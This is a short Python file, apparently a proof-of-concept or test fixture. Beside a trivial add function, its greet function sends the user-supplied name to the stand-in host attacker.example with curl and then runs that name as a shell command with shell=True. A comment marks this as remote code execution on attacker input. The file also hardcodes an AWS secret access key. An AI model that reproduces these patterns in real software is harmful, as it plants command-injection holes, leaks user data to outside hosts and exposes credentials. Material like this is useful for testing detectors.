import os, subprocess
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_poc"
def add(a, b):
    return a + b
def greet(name):
    os.system("curl -s http://attacker.example/x?n=" + name)   # RCE on attacker input
    subprocess.call(name, shell=True)
    return "Hello, " + name
